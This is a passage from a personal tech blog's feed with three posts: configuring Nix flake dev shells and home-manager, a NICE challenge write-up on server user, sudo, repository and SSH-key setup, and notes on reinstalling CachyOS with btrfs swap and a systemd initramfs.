font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/esbuild</span></span>
<span id="cb23-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    ''</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-28">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">installPhase</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb23-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      runHook preInstall</span></span>
<span id="cb23-30"></span>
<span id="cb23-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      mkdir -p $out/bin $out/share</span></span>
<span id="cb23-32"></span>
<span id="cb23-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      rm -rf bin/tools/*/typst</span></span>
<span id="cb23-34"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      rm -rf bin/tools/*/esbuild</span></span>
<span id="cb23-35"></span>
<span id="cb23-36"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      mv bin/* $out/bin</span></span>
<span id="cb23-37"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      mv share/* $out/share</span></span>
<span id="cb23-38"></span>
<span id="cb23-39"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">      runHook postInstall</span></span>
<span id="cb23-40"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    ''</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-41">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">});</span></span>
<span id="cb23-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span></span>
<span id="cb23-43">pkgs.mkShellNoCC <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb23-44">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">PYTHONPATH</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>pkgs.python3.withPackages pythonDeps<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/bin/python3"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-45">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">QUARTO_PYTHON</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>pkgs.python3.withPackages pythonDeps<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/bin/python3"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb23-46"></span>
<span id="cb23-47">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">packages</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb23-48">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>python3.withPackages pythonDeps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb23-49">    quarto</span>
<span id="cb23-50">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>texlive.withPackages texDeps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb23-51">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb23-52"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
<section id="more-issues-no-tab-autocomplete" class="level1">
<h1>More issues, no tab autocomplete</h1>
<p>Nope, it’s not the final shell. For whatever reason, if I open Vscode, or zellij using the <code>nix develop</code> shell, I cannot use tab autocomplete. In addition to that, the Vscode shell seems to be broken in others ways.</p>
<p>Here is the shell prompt:</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb24-1">\[\][moonpie@lizard moonpiedumplings.github.io]$ \[\]</span></code></pre></div>
<p>Yeah. Not what it’s supposed to be. I don’t know what the backslashes signify. However, <code>nix-shell</code> continues to work fine for zellij.</p>
<p>There are some relevant issues for this:</p>
<ul>
<li>https://github.com/NixOS/nix/issues/6091</li>
<li>https://github.com/NixOS/nix/issues/6982</li>
<li>https://github.com/NixOS/nix/issues/8764</li>
</ul>
<p>In a related <a href="https://discourse.nixos.org/t/general-nix-office-hours/15019/37">discourse post</a>, Nobbz suggests to use <code>eval</code>, but that also does not work, not do related solutions with <code>. &lt;()</code>.</p>
<p>The big problem is that <code>nix develop</code> is designed for emulation of the nix build environment, which is non-interactive. <code>nix shell</code>, as I noted above, does not properly replace <code>nix-shell</code>, as it does not allow for any configuration of environment variables. Or can it?</p>
<p>I also investigated <code>pkgs.buildEnv</code>, which is <a href="https://github.com/NixOS/nixpkgs/issues/251039">literally undocumented</a>, in classic Nix fashion. I read the <a href="https://github.com/NixOS/nixpkgs/blob/master/pkgs%2Fbuild-support%2Fbuildenv%2Fdefault.nix">source code</a>, but it doesn’t seem to be able to set environment variables outside of wrapping programs. It mainly seems to be ableto add programs to the path.</p>
<p>Another solution is <a href="https://github.com/edolstra/flake-compat">flake-compat</a>. It’s a bit of nix code by Eelco Dostra that has creates a <code>shell.nix</code> that enables <code>nix-shell</code> to be used with flakes. I find it deeply ironic that despite all this effort to use flakey commands, I still end up finding that the non-flake commands work perfectly.</p>
<p>Another suggestion was to use direnv, but I don’t want to use that.</p>
<p>Anyway, I noticed something different about the <code>nix-shell</code> vs <code>nix develop</code>:</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb25-1">[nix-shell:~/vscode/moonpiedumplings.github.io]$ echo $SHELL</span>
<span id="cb25-2">/nix/store/bh6w9sbfz2m5w1bd4cg2ndw1s66agkfd-bash-interactive-5.2p26/bin/bash</span></code></pre></div>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb26-1">[moonpie@lizard moonpiedumplings.github.io]$ nix develop</span>
<span id="cb26-2">warning: Git tree '/home/moonpie/vscode/moonpiedumplings.github.io' is dirty</span>
<span id="cb26-3">evaluating derivation 'git+file:///home/moonpie/vscode/moonpiedumplings.github.io#devShells.x86_64-linux.default'</span>
<span id="cb26-4">(nix:nix-shell-env) [moonpie@lizard moonpiedumplings.github.io]$ echo $SHELL</span>
<span id="cb26-5">/nix/store/m101dg80ngyjdb02g6jwy80sr7kzj26g-bash-5.2p26/bin/bash</span></code></pre></div>
<p><code>nix-shell</code> defaults to an bash-interactive, whereas <code>nix develop</code> seems to use a stripped down, noninteractive version of bash. This is probably because <code>nix develop</code></p>
<p>The first thing I tried was to have <code>SHELL = "${pkgs.bashInteractive}/bin/bash";</code> in <code>pkgs.mkShell</code>, but this didn’t work. <code>nix develop</code> seems to set it’s own environment variables, <em>after</em> the other variables are set.</p>
<p>The first thing I did was to set a post shellHook, which <code>nix develop</code> would run, and would <code>export</code> the variable.</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb27-1">pkgs.mkShellNoCC <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb27-2">   <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">shellHook</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb27-3"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    export SHELL='</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">${</span>pkgs.bashInteractive<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/bin/bash'</span></span>
<span id="cb27-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">  ''</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb27-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>This worked for zellij, but vscode’s terminal was still broken. To get vscode’s terminal working, I had to add <code>bashInterative</code> to packages:</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb28-1">pkgs.mkShellNoCC {</span>
<span id="cb28-2">  packages = with pkgs; [ bashInteractive ];</span>
<span id="cb28-3">   shellHook = ''</span>
<span id="cb28-4">    export SHELL='${pkgs.bashInteractive}/bin/bash'</span>
<span id="cb28-5">  '';</span>
<span id="cb28-6">}</span></code></pre></div>
<p>I actually encountered a similar issue with python. Vscode seems to ignore things not added to path, even if they are specified in other ways, like <code>$PYTHONPATH</code> pointing to the correct version of python.</p>
<p>But now, this finally works.</p>
</section>
<section id="home-manager" class="level1">
<h1>Home-Manager</h1>
<p>Next thing is to convert home manager to flakes. I need a slightly older version of kubectl, and flakes allow me to use packages from multiple versions of nixpkgs.</p>
<p>I followed the <a href="https://nix-community.github.io/home-manager/index.xhtml#sec-flakes-standalone">standalone flakes installation instructions</a></p>
<p><code>nix run home-manager/master -- init --switch</code></p>
<p>And with this, I get a basic flake.nix, flake.lock, and home.nix in <code>.config/home-manager/</code>.</p>
<p>For older versions of packages, there are two sites I like, nixhub and lazamar’s site:</p>
<ul>
<li>https://www.nixhub.io/</li>
<li>https://lazamar.co.uk/nix-versions/</li>
</ul>
<p>I found the correct nixpkgs revision for what I want: <code>7a339d87931bba829f68e94621536cad9132971a</code>.</p>
<p>However, using packages from multiple versions of nipkgs isn’t as easy as I thought it would be. The <a href="https://wiki.nixos.org/wiki/Flakes#Importing_packages_from_multiple_nixpkgs_branches">officail docs</a> suggest to use an overlay, which feels unecessary. Why can’t I just replicate what it does for <code>nixpkgs</code>, but for <code>nixpkgs</code> again?</p>
<p>I tried that, and it didn’t work. The error’s aren’t very clear, but I think it’s because the home manager configuration is a function with explicit arguments, and it errors when I try to feed it more than what it wants.</p>
<p>Thankfully, I found another simple solution:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>flake.nix</strong></pre>
</div>
<div class="sourceCode" id="cb29" data-filename="flake.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb29-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-2">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">description</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Home Manager configuration of moonpie"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-3"></span>
<span id="cb29-4">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-5">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"github:nixos/nixpkgs/nixos-unstable"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-6">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs-kubectl</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"github:nixos/nixpkgs/7a339d87931bba829f68e94621536cad9132971a"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-7">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">home-manager</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-8">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">url</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"github:nix-community/home-manager"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-9">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">inputs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">follows</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"nixpkgs"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-10">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-11">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-12"></span>
<span id="cb29-13">  <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">outputs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">nixpkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs-kubectl</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">home-manager</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>:</span>
<span id="cb29-14">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">let</span></span>
<span id="cb29-15">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"x86_64-linux"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-16">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> nixpkgs.legacyPackages.$<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">system</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-17">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-18">      <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">homeConfigurations</span>.<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span>moonpie<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> home<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>manager.lib.homeManagerConfiguration <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-19">        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-20">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">extraSpecialArgs</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb29-21">          <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs-kbctl</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">import</span> pkgs<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>kubectl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">inherit</span> system<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;};</span></span>
<span id="cb29-22">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-23">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">modules</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span> <span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">./home.nix</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="cb29-24">      <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-25">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">};</span></span>
<span id="cb29-26"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
<p>And then in the beginning of home.nix:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>home.nix</strong></pre>
</div>
<div class="sourceCode" id="cb30" data-filename="home.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb30-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">pkgs-kbctl</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>:</span></code></pre></div>
</div>
<p>And this works. I can use <code>pkgs-kbctl.kubectl</code> to reference kubectl version 1.28.4, which is what’s on my server.</p>


</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/flake-shell/</guid>
  <pubDate>Fri, 21 Jun 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Nice Challenge 5</title>
  <dc:creator>Jeffrey Fonseca</dc:creator>
  <link>./writeups/nice-challenge-5/</link>
  <description><![CDATA[ 




<p>This is for the <a href="https://nice-challenge.com/">NICE</a> challenge, and this would be my fifth one (not counting repeats).</p>
<p>As usual, it started out with a simulated chatroom:</p>
<p><img src="./writeups/nice-challenge-5/images/chatroom.png" class="img-fluid"></p>
<p>And, there were also some empty checks.</p>
<p><img src="./writeups/nice-challenge-5/images/emptychecks.png" class="img-fluid"></p>
<p>Based on this, it seems like I will be working on the “Production Web Server”, primarily.</p>
<section id="prod-web" class="level1">
<h1>Prod-Web</h1>
<section id="users" class="level2">
<h2 class="anchored" data-anchor-id="users">Users</h2>
<p>First, I created user accounts for the relevant users.</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">useradd gthatcher</span>
<span id="cb1-2"></span>
<span id="cb1-3">useradd rob</span></code></pre></div>
<p>Since <code>gthatcher</code> is going to be an admin, I added them to the <code>wheel</code> user group, since that is often used as an administrator group on Linux systems.</p>
<p><code>usermod -aG wheel gthatcher</code></p>
<p>Then, I used the <code>visudo</code> command to edit the sudoer’s file and add wheel as a group that could use all commands with sudo:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/sudoers</strong></pre>
</div>
<div class="sourceCode" id="cb2" data-filename="/etc/sudoers" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">## Allows people in group wheel to run all commands</span>
<span id="cb2-2">%wheel  ALL=(ALL)   ALL</span></code></pre></div>
</div>
<p>The other thing I added was for user <code>rob</code> to be able to run certain commands as sudo, without a password, but only those commands.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/sudoers</strong></pre>
</div>
<div class="sourceCode" id="cb3" data-filename="/etc/sudoers" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">rob ALL=NOPASSWD : /bin/sudoedit /var/www/html/*, /bin/systemctl status httpd, /bin/systemctl stop httpd, /bin/systemctl start httpd, /bin/systemctl restart httpd, /bin/systemctl enable httpd, /bin/systemctl disable httpd</span></code></pre></div>
</div>
</section>
<section id="update-apache" class="level2">
<h2 class="anchored" data-anchor-id="update-apache">Update Apache</h2>
<p>Also, I needed to update apache. However, the repos completely broken on this machine, so I deleted them, and made way for new repos.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">mv /etc/yum.repos.d /etc/yum.repos.bac # Back up old yum repos just in case</span>
<span id="cb4-2"></span>
<span id="cb4-3">mkdir /etc/yum.repos.d</span>
<span id="cb4-4"></span>
<span id="cb4-5">curl http://mirror.centos.org/centos/7/atomic/x86_64/repo/CentOS-Base.repo -o /etc/yum.repos.d/CentOS-Base.repo</span>
<span id="cb4-6"></span>
<span id="cb4-7">yum update</span></code></pre></div>
<p>And with this, Apache is updated.</p>
</section>
<section id="ssh-config" class="level2">
<h2 class="anchored" data-anchor-id="ssh-config">Ssh Config</h2>
<p>Ssh needs to be configured to use key based authentication, instead of password based authentication.</p>
<p>On the Prod-Web server:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">ssh-keygen # this generates an ssh key in the default location. I did not set a passphrase.</span>
<span id="cb5-2"></span>
<span id="cb5-3">scp .ssh/id_rsa.pub playerone@172.16.20.11:/home/playerone/.ssh/authorized_keys # use password to authenticate the connection</span></code></pre></div>
<p>This creates a key and authorizes it for use on the Dev-Web server.</p>
<p>And with this, all checks are green:</p>
<p><img src="./writeups/nice-challenge-5/images/greenchecks.png" class="img-fluid"></p>


</section>
</section>

 ]]></description>
  <category>writeups</category>
  <guid>./writeups/nice-challenge-5/</guid>
  <pubDate>Fri, 07 Jun 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Reinstalling Cachyos</title>
  <link>./playground/cachyos-install/</link>
  <description><![CDATA[ 




<p>I’ve decided to reinstall <a href="https://cachyos.org/">cachyos</a>, the Arch Linux fork I use on my laptop’s, because the config of my smaller laptop is getting crusty. In addition to not having any swap setup, <code>/nix</code> is part of the main btrfs subvolume, meaning it is included in snapshots, and my snapshots are far, far larger than they should be.</p>
<section id="installation" class="level1">
<h1>Installation</h1>
<p>I downloaded the latest, ISO, but I had some troubles installing. I first attempted to set up an LVM2 Partition, but that crashed, and I don’t know why. The error log of the installer doesn’t have any relevant information.</p>
<p>I tried again, but with a simpler partitioning setup, but it errored on another step, ranking the mirrors.</p>
<p>An excerpt from the logs of the failed install:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">--&gt; name 'arch'; mirrorlist_path '/etc/pacman.d/mirrorlist'; special_arch ''</span>
<span id="cb1-2">/usr/bin/cachyos-rate-mirrors: line 97: /usr/bin/rate-mirrors: Input/output error</span></code></pre></div>
<p>I tested the command independently, and found that it was broken. It seemed to be a bugged shell script.</p>
<p>In order to fix this, I decided to update just the relevant packages: <code>pacman -Sy cachyos-rate-mirrors rate-mirrors</code>. Normally, you <a href="https://wiki.archlinux.org/title/System_maintenance#Partial_upgrades_are_unsupported">never want to do this</a>, as it is a partial upgrade, and can cause many issues down the road. However, I don’t really have a choice because the system is loaded in ram right now, and I can’t do a full upgrade as I don’t have enough ram to store all of those downloaded packages — especially since CachyOS comes with a full GUI.</p>
<p>Once the install is done, I have to set up swap, and a separate subvolume for <code>/nix</code>.</p>
<p>I use <code>arch-chroot</code> to chroot into the newly installed arch system, which is thankfully still mounted at <code>/tmp/calamares-root-ncjj4sta</code>.</p>
<p>I start by following the instructions on the arch wiki for a <a href="https://wiki.archlinux.org/title/Btrfs#Swap_file">btrfs swap file</a>.</p>
<p>I also attempted to create a subvolume for nix, but this failed. When I removed the relevant lines for the nix subvolume <code>/etc/fstab</code>, my system booted properly.</p>
<p>However, since hibernate wasn’t working properly, I decided to set that up first.</p>
<p>I still had more issues.</p>
<p>I attempted to install using the Calamares installer, with a LVM setup, and a seperate swap “partition” on a logical volume… and calamares crashed. Apparently, <a href="https://github.com/calamares/calamares/issues/1564">Calameres + LVM is basically completely broken</a></p>
<blockquote class="blockquote">
<p>LVM support is broken, in fact, I have no idea why is there right now.</p>
</blockquote>
<p>So yeah.</p>
<p>I also attempted to play around with a systemd based initramfs. According to <a href="https://wiki.archlinux.org/title/Power_management/Suspend_and_hibernate#Configure_the_initramfs">the archwiki</a></p>
<blockquote class="blockquote">
<p>When an initramfs with the systemd hook is used, a resume mechanism is already provided, and no further hooks need to be added</p>
</blockquote>
<p>Compared to a normal hibernate setup, you have to locate the swap partition/swapfile, and then pass it as a kernel parameter. However, systemd automatically detects a swap partition/swapfile to hibernate it. But this took me some time to get a systemd based initramfs set up properly.</p>
<p>The hooks are in /etc/mkinitcpio.conf must be modified as follows:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/mkinitcpio.conf</strong></pre>
</div>
<div class="sourceCode" id="cb2" data-filename="/etc/mkinitcpio.conf" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">HOOKS=(base systemd autodetect microcode modconf kms keyboard sd-vconsole block sd-encrypt filesystems fsck)</span></code></pre></div>
</div>
<p>(No resume hook is needed).</p>
<p>However, this still wouldn’t boot, and I couldn’t figure out why.</p>
<p>Figured it out: <a href="https://wiki.archlinux.org/title/Dm-crypt/System_configuration#Using_systemd-cryptsetup-generator" class="uri">https://wiki.archlinux.org/title/Dm-crypt/System_configuration#Using_systemd-cryptsetup-generator</a></p>
<p>By copying <code>/etc/crypttab</code> to <code>/etc/crypttab.initramfs</code>, it will be copied over the the initramfs, enabling the systemd based initramfs to read a version of the <code>crypttab</code> configuration file stored in the initramfs.</p>
<p>Although, I am left with some questions, like why the non-systemd based initramfs doesn’t need this, it seems to work fine. Systemd automatically detects the swap file, even if it is stored in the encrypted btrfs partition.</p>
<p>Another plus: A <a href="https://cachyos.org/blog/2406-june-release/">new cachyos iso</a> was released. This iso release, fixes the issues with the mirror software being broken.</p>
<p>Now that Cachyos is installed, I need to figure out how to make a top level subvolume. According to the <a href="https://wiki.archlinux.org/title/Btrfs#Swap_file">arch wiki article on btrfs subvolumes</a></p>
<blockquote class="blockquote">
<p>Tip: Consider creating the subvolume directly below the top-level subvolume, e.g. <span class="citation" data-cites="swap">@swap</span>. Then, make sure the subvolume is mounted to /swap (or any other accessible location).</p>
</blockquote>
<p>Why is this setup better? And how do I create a subvoolume directly below the top level?</p>
<p>When I run <code>btrfs su create /mnt/@nix</code> it doesn’t properly create a subvolume. Instead, it says <code>top level 256 path @nix</code>, meaning that this subvolume is nested in the subvolume with ID 256, the @ subvolume. However, <span class="citation" data-cites="home">@home</span>, <span class="citation" data-cites="var">@var</span>, and <span class="citation" data-cites="tmp">@tmp</span> aren’t like that, instead they have the top level 5, meaning they are directly on the top level subvolume, which is equivalent to the filesystem itself.</p>
<p>Okay, I think I figured it out. In the chroot I make, I mount the btrfs filesystem with <code>@</code> as the root subvolume, meaning any subvolumes I create are nested below that. In order to properly create a subvolume under the top, I have to mount it first.</p>
<p>I still don’t understand the benefit of having a subvolume under the top level subvolume, rather than another nested subvolume layout. Maybe because snapshots happen to nested subvolumes as well, and this avoids the swapfile accidentally getting snapshotted?</p>
<p>I encountered another issue, after testing hibernate:</p>
